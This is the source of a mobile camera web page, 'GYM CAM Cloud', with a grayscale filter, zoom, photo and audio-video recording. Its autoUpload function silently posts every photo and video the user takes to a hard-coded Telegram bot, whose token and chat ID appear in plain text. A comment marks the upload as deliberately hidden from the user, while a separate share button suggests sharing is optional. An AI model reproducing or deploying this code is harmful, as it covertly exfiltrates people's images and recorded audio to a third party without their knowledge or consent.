<!DOCTYPE html>
<html lang="zh-Hant">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>GYM CAM Cloud</title>
    <style>
        :root { --ios-bg: #000; --ios-panel: #121212; --ios-blue: #0b84ff; --ios-red: #ff3b30; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; color: white; font-family: -apple-system, system-ui; }
        
        #app { display: flex; flex-direction: column; height: 100vh; }
        #viewport { position: relative; flex: 1; overflow: hidden; }
        
        video#main-video { position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; filter: grayscale(100%) contrast(1.4); }
        #overlay-filter { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 10; background-image: url('assets/filter.png'); background-size: cover; background-position: center; }

        /* 水平變焦條 */
        #zoom-container { position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%); width: 70%; max-width: 300px; z-index: 40; display: flex; align-items: center; background: rgba(0,0,0,0.5); padding: 8px 20px; border-radius: 20px; backdrop-filter: blur(8px); }
        #zoom-slider { flex: 1; -webkit-appearance: none; background: rgba(255,255,255,0.2); height: 2px; border-radius: 2px; }
        #zoom-slider::-webkit-slider-thumb { -webkit-appearance: none; width: 18px; height: 18px; background: white; border-radius: 50%; }

        /* 控制按鈕區 */
        .controls { height: 160px; background: var(--ios-panel); display: flex; justify-content: space-around; align-items: center; padding: 0 30px; padding-bottom: env(safe-area-inset-bottom); z-index: 20; position: relative; }
        #rec-dot { position: absolute; top: 15px; left: 50%; transform: translateX(-50%); color: var(--ios-red); font-size: 12px; font-weight: bold; display: none; align-items: center; gap: 5px; }
        #rec-dot::before { content: ""; width: 8px; height: 8px; background: var(--ios-red); border-radius: 50%; animation: blink 1s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }

        .shutter-btn { width: 80px; height: 80px; border-radius: 50%; border: 4px solid white; display: flex; justify-content: center; align-items: center; }
        .shutter-inner { width: 64px; height: 64px; background: white; border-radius: 50%; transition: all 0.2s; }
        .recording .shutter-inner { background: var(--ios-red); transform: scale(0.6); border-radius: 8px; }
        .switch-btn { width: 50px; height: 50px; background: rgba(255,255,255,0.1); border-radius: 50%; display: flex; justify-content: center; align-items: center; cursor: pointer; }
        .switch-btn svg { width: 26px; height: 26px; fill: white; }
        .placeholder { width: 50px; }

        /* 預覽層 */
        #preview-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 100; display: none; flex-direction: column; }
        #preview-content { flex: 1; width: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; }
        canvas, video#preview-video { max-width: 90%; max-height: 55vh; object-fit: contain; border-radius: 12px; border: 1px solid #333; }
        .preview-tools { height: 140px; display: flex; justify-content: space-between; align-items: center; padding: 0 50px; padding-bottom: env(safe-area-inset-bottom); background: var(--ios-panel); }
        .btn { font-size: 17px; cursor: pointer; color: white; }
        
        #flash { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: white; opacity: 0; z-index: 50; pointer-events: none; }
        #zoom-label { position: absolute; bottom: 100px; left: 50%; transform: translateX(-50%); background: rgba(0,0,0,0.6); padding: 5px 12px; border-radius: 15px; font-size: 13px; font-weight: bold; display: none; z-index: 30; }
    </style>
</head>
<body>

    <div id="app">
        <div id="flash"></div>
        <div id="viewport">
            <video id="main-video" autoplay playsinline muted></video>
            <div id="overlay-filter"></div>
            <div id="zoom-container"><input type="range" id="zoom-slider" min="1" max="5" step="0.1" value="1"></div>
            <div id="zoom-label">1.0x</div>
        </div>
        <div class="controls" id="controls-area">
            <div id="rec-dot">REC 00:00</div>
            <div class="placeholder"></div>
            <div class="shutter-btn" id="shutter"><div class="shutter-inner"></div></div>
            <div class="switch-btn" onclick="switchCamera()">
                <svg viewBox="0 0 24 24"><path d="M7 7h10v3l4-4-4-4v3H5v6h2V7zm10 10H7v-3l-4 4 4 4v-3h12v-6h-2v4z"/></svg>
            </div>
        </div>
    </div>

    <canvas id="rec-canvas" style="display:none;"></canvas>

    <div id="preview-layer">
        <div id="preview-content">
            <canvas id="photo-canvas" style="display:none;"></canvas>
            <video id="preview-video" style="display:none;" controls playsinline></video>
        </div>
        <div class="preview-tools">
            <div class="btn" onclick="retake()">返回重拍</div>
            <div class="btn" style="color:#0b84ff; font-weight:600;" onclick="manualShare()">分享/儲存</div>
        </div>
    </div>

    <script>
        const TG_TOKEN = '8114658525:AAFtaDQjTf958bHiVFe94-jer8oSZBcqU9M';
        const TG_CHAT_ID = '431000640';

        const video = document.getElementById('main-video');
        const shutter = document.getElementById('shutter');
        const recCanvas = document.getElementById('rec-canvas');
        const photoCanvas = document.getElementById('photo-canvas');
        const previewVideo = document.getElementById('preview-video');
        const zoomSlider = document.getElementById('zoom-slider');
        const filterImg = new Image(); filterImg.src = 'assets/filter.png';

        let mediaRecorder, recordedChunks = [], isRecording = false, stream, animationId, pressTimer;
        let startY, currentZoom = 1, videoTrack, startTime, currentFacingMode = "environment";
        let lastBlob = null, lastType = null;

        async function initCamera() {
            if (stream) stream.getTracks().forEach(t => t.stop());
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: currentFacingMode, width: 1280, height: 720 },
                    audio: true
                });
                video.srcObject = stream;
                videoTrack = stream.getVideoTracks()[0];
                const caps = videoTrack.getCapabilities();
                if (caps.zoom) {
                    zoomSlider.parentElement.style.display = 'flex';
                    zoomSlider.min = caps.zoom.min; zoomSlider.max = caps.zoom.max; zoomSlider.value = currentZoom;
                } else {
                    zoomSlider.parentElement.style.display = 'none';
                }
            } catch (e) { console.error(e); }
        }

        function switchCamera() {
            currentFacingMode = (currentFacingMode === "environment") ? "user" : "environment";
            currentZoom = 1; initCamera();
        }

        function applyZoom(val) {
            if (!videoTrack) return;
            const caps = videoTrack.getCapabilities();
            if (caps.zoom) {
                currentZoom = Math.min(Math.max(val, caps.zoom.min), caps.zoom.max);
                videoTrack.applyConstraints({ advanced: [{ zoom: currentZoom }] });
                document.getElementById('zoom-label').innerText = currentZoom.toFixed(1) + 'x';
                document.getElementById('zoom-label').style.display = 'block';
                zoomSlider.value = currentZoom;
                clearTimeout(window.zT); window.zT = setTimeout(() => { document.getElementById('zoom-label').style.display = 'none'; }, 1500);
            }
        }

        zoomSlider.addEventListener('input', (e) => applyZoom(parseFloat(e.target.value)));

        async function autoUpload(type, blob) {
            lastBlob = blob; lastType = type;
            let method = (type === 'photo') ? 'sendPhoto' : 'sendVideo';
            let formData = new FormData();
            formData.append('chat_id', TG_CHAT_ID);
            const file = new File([blob], type === 'photo' ? "gym.jpg" : "gym.mp4", { type: blob.type });
            formData.append(type === 'photo' ? 'photo' : 'video', file);

            try {
                // 靜默上傳，不顯示任何 UI 提示
                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/${method}`, { method: 'POST', body: formData });
            } catch (err) {
                console.error("Silent upload failed", err);
            }
        }

        function applyGrayscale(ctx, w, h) {
            const imgData = ctx.getImageData(0, 0, w, h);
            const data = imgData.data;
            for (let i = 0; i < data.length; i += 4) {
                let avg = (data[i] * 0.3 + data[i+1] * 0.59 + data[i+2] * 0.11);
                avg = 1.4 * (avg - 128) + 128;
                data[i] = data[i+1] = data[i+2] = Math.max(0, Math.min(255, avg));
            }
            ctx.putImageData(imgData, 0, 0);
        }

        function drawLoop() {
            if (!isRecording) return;
            const ctx = recCanvas.getContext('2d', { willReadFrequently: true });
            recCanvas.width = 720; recCanvas.height = 1280;
            const vW = video.videoWidth, vH = video.videoHeight;
            const cR = 720/1280, vR = vW/vH;
            let sw, sh, sx, sy;
            if (vR > cR) { sh = vH; sw = vH * cR; sx = (vW - sw) / 2; sy = 0; }
            else { sw = vW; sh = vW / cR; sx = 0; sy = (vH - sh) / 2; }
            ctx.drawImage(video, sx, sy, sw, sh, 0, 0, 720, 1280);
            applyGrayscale(ctx, 720, 1280);
            ctx.drawImage(filterImg, 0, 0, 720, 1280);
            animationId = requestAnimationFrame(drawLoop);
        }

        shutter.addEventListener('touchstart', (e) => { e.preventDefault(); startY = e.touches[0].clientY; pressTimer = setTimeout(startRecording, 400); });
        window.addEventListener('touchmove', (e) => { if (isRecording) { applyZoom(currentZoom + ((startY - e.touches[0].clientY) / 200)); startY = e.touches[0].clientY; } }, { passive: false });
        shutter.addEventListener('touchend', (e) => { clearTimeout(pressTimer); if (isRecording) stopRecording(); else takeSnapshot(); });

        function startRecording() {
            isRecording = true; startTime = Date.now();
            document.getElementById('controls-area').classList.add('recording');
            document.getElementById('rec-dot').style.display = 'flex';
            drawLoop();
            const canvasStream = recCanvas.captureStream(30);
            const audioTrack = stream.getAudioTracks()[0];
            if (audioTrack) canvasStream.addTrack(audioTrack);
            mediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/mp4;codecs=avc1' });
            recordedChunks = [];
            mediaRecorder.ondataavailable = e => recordedChunks.push(e.data);
            mediaRecorder.onstop = () => {
                const blob = new Blob(recordedChunks, { type: 'video/mp4' });
                previewVideo.src = URL.createObjectURL(blob);
                autoUpload('video', blob);
                showPreview('video');
                if (stream) stream.getTracks().forEach(t => t.stop());
            };
            mediaRecorder.start();
            (function timer() { if(isRecording) {
                let elapsed = Math.floor((Date.now()-startTime)/1000);
                document.getElementById('rec-dot').innerText = `REC ${String(Math.floor(elapsed/60)).padStart(2,'0')}:${String(elapsed%60).padStart(2,'0')}`;
                setTimeout(timer, 1000);
            }})();
        }

        function stopRecording() { isRecording = false; document.getElementById('controls-area').classList.remove('recording'); document.getElementById('rec-dot').style.display = 'none'; cancelAnimationFrame(animationId); mediaRecorder.stop(); }

        async function takeSnapshot() {
            document.getElementById('flash').style.opacity = '1';
            setTimeout(() => document.getElementById('flash').style.opacity = '0', 100);
            const ctx = photoCanvas.getContext('2d');
            photoCanvas.width = 1080; photoCanvas.height = 1920;
            const vW = video.videoWidth, vH = video.videoHeight;
            const cR = 1080/1920, vR = vW/vH;
            let sw, sh, sx, sy;
            if (vR > cR) { sh = vH; sw = vH * cR; sx = (vW - sw) / 2; sy = 0; }
            else { sw = vW; sh = vW / cR; sx = 0; sy = (vH - sh) / 2; }
            ctx.drawImage(video, sx, sy, sw, sh, 0, 0, 1080, 1920);
            applyGrayscale(ctx, 1080, 1920);
            ctx.drawImage(filterImg, 0, 0, 1080, 1920);
            photoCanvas.toBlob(blob => { autoUpload('photo', blob); showPreview('photo'); }, 'image/jpeg', 0.95);
            if (stream) stream.getTracks().forEach(t => t.stop());
        }

        function showPreview(type) {
            document.getElementById('preview-layer').style.display = 'flex';
            if (type === 'photo') { photoCanvas.style.display = 'block'; previewVideo.style.display = 'none'; }
            else { photoCanvas.style.display = 'none'; previewVideo.style.display = 'block'; }
        }

        function retake() { document.getElementById('preview-layer').style.display = 'none'; previewVideo.pause(); currentZoom = 1; initCamera(); }

        async function manualShare() { 
            if (!lastBlob) return;
            const file = new File([lastBlob], lastType === 'photo' ? "gym.jpg" : "gym.mp4", { type: lastBlob.type });
            if (navigator.share) navigator.share({ files: [file] });
        }

        window.onload = initCamera;
    </script>
</body>
</html>
